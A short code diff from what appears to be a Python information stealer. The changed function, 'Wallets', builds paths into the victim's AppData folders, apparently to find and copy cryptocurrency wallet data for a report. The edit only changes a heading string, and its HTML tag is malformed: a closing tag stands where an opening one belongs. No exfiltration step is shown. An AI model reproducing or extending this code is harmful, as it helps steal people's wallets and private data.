@@ -16,7 +16,7 @@ from shutil import copytree
 
 def Wallets(data):
     try:
-        data.append("\n\n💰Wallets💰")
+        data.append("\n\n</b>💰Wallets💰</b>")
         print("w")
         pathtofile = environ['USERPROFILE'] + sep + r'AppData\Roaming'
         pathtofolder = environ['USERPROFILE'] + sep + r'AppData\Local'
